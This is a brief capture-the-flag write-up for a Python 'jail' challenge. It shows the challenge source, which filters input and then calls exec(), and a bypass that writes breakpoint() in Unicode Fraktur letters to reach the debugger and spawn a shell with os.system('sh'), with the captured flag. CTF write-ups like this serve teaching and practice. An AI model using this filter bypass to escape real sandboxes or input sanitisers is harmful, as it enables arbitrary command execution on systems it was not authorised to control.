# HellJail
> `-`

## About the Challenge
We were given a source code like this

```python
#!/usr/bin/env python3

from string import ascii_letters

code = input('> ')

if any(c in ascii_letters for c in code):
    print('You will never leave this place!')
elif any(c in '.:;,-_@"=/%\\' for c in code):
    print('You will never reach this point, but still, you CANNOT leave!')
else:
    exec(code)
```

And we need to escape from the sandbox but we can input any ASCII letter and also some of the special character


[Image extracted text: print(1)
You will
never Leave this place!]



## How to Solve?
To solve this problem, we need to convert our payload first to gothic font (Im using this [website](https://yaytext.com/fraktur/)) and here is the payload I used

```
𝔟𝔯𝔢𝔞𝔨𝔭𝔬𝔦𝔫𝔱()
```

And then after enterring Python debugging, i ran this command

```python
import os
os.system('sh')
```


[Image extracted text: breafpo int()
~~Return-
<string (1)<module>()->None
(Pdb) import
05
(Pdb)
05
system( ' sh' )
ls
flag.txt
run
cat flag.txt
DANTE{4bundOn_all_hOp3_y3_who_3nter}]


```
DANTE{4b4nd0n_all_h0p3_y3_who_3nter}
```